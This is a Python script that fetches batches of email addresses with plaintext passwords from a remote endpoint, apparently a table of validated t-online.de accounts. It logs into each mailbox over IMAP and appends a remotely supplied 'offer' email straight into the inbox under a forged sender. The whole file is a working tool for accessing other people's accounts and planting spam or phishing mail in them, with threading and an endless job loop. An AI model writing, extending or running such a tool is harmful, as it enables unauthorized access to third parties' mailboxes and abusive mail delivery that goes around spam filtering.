import imaplib
import time
import requests
from datetime import datetime, timezone
from email.message import EmailMessage
from email.utils import format_datetime
from concurrent.futures import ThreadPoolExecutor
import secrets
import string

def random_string(length=12):
    chars = string.ascii_letters + string.digits
    return ''.join(secrets.choice(chars) for _ in range(length))
    
MAX_THREADS = 5  # Adjust this based on how many concurrent operations you want
SUPABASE_URL_offer = "https://vuudkapcuwtkepeqkpfx.supabase.co/functions/v1/get_offer_append"
SUPABASE_URL_offer = "https://script.google.com/macros/s/AKfycbyYXiCRBzmMTyjUjAmD_ENVyem49meqmv_Tkdj2gb5PsoXygCwbFQBY1Pu_xuCB6a_63Q/exec"
table_name = "t_online_de_valid"
offerName = "wowTv"

PARAMS_1 = {
    "table": table_name,
    "action": "get_offer",
    "offerName": offerName
}

PARAMS_2 = {
    "table": table_name,
    "max_accounts": 10,
    "action": "get_imap",
    "offerName": offerName
}

offer_response = None
while True:
    try:
        offer_response = requests.get(
            SUPABASE_URL_offer,
            params=PARAMS_1,
            timeout=120
        )
        break
    except:
        pass
        
offer_data = offer_response.json()['result']
from_name = offer_data['from_name']
from_email = offer_data['from_email']
subject = offer_data['subject']
msg_body = offer_data['letter'].replace("[table_name]",table_name).replace("[offer_name]",offerName)

def process_imap_append(data):
    """Handles the email compilation and IMAP appending for a single record."""
    email_to = None
    cycle = random_string(5)
    for acc in data:
        defa = cycle + " -> " + acc['email_to']
        #print(defa)
        try:
            email_to = acc['email_to']
            email_md5 = acc['email_md5']
            password = acc['password']
            imap = acc['imap']
            port = acc['port']
            
            html = msg_body
            html = html.replace("[em]",email_md5)
            
            # Create email
            msg = EmailMessage()
            msg["From"] = f"{from_name} <{from_email}>"
            msg["To"] = email_to
            msg["Subject"] = subject
            msg["Date"] = format_datetime(datetime.now(timezone.utc))
            msg["MIME-Version"] = "1.0"
    
            # HTML body
            msg.set_content("Please view this email in an HTML-capable email client.")
            msg.add_alternative(html, subtype="html", charset="utf-8")
    
            # Connect to IMAP
            mail = imaplib.IMAP4_SSL(imap, port, timeout=20)
            mail.login(email_to, password)
    
            # Append to Inbox
            status, res_data = mail.append(
                "INBOX",
                None,
                imaplib.Time2Internaldate(datetime.now(timezone.utc)),
                msg.as_bytes()
            )
            
            mail.logout()
            print(f"success {cycle}: {email_to}")
    
        except Exception as e:
            print(f"error handling {email_to or 'Unknown Email'}: {e}")

def main():
    # ThreadPoolExecutor manages worker threads efficiently
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        while True:
            response = None
            try:
                print("Start...")
                # 1. Fetch a job from the database sequentially in the main thread
                
                response = requests.get(
                    SUPABASE_URL_offer,
                    params=PARAMS_2,
                    timeout=120
                )
                
                if response.status_code != 200:
                    print(f"Server error ({response.status_code}): Retrying...")
                    time.sleep(3)
                    continue
                    
                json_data = response.json()
                result_data = json_data.get('result')
                
                if not result_data:
                    print("No more data or empty result received:", json_data)
                    time.sleep(5)
                    continue
                
                # 2. Hand off the data payload to an available thread worker
                executor.submit(process_imap_append, result_data)
                
                # Small delay to keep the main loop from hammering the get endpoint instantly
                time.sleep(3)

            except requests.exceptions.JSONDecodeError:
                print("Response is not valid JSON:")
                if response:
                    print(response.text)
                time.sleep(3)
            except Exception as e:
                print(f"Main loop error fetching data: {e}")
                time.sleep(3)

if __name__ == "__main__":
    main()
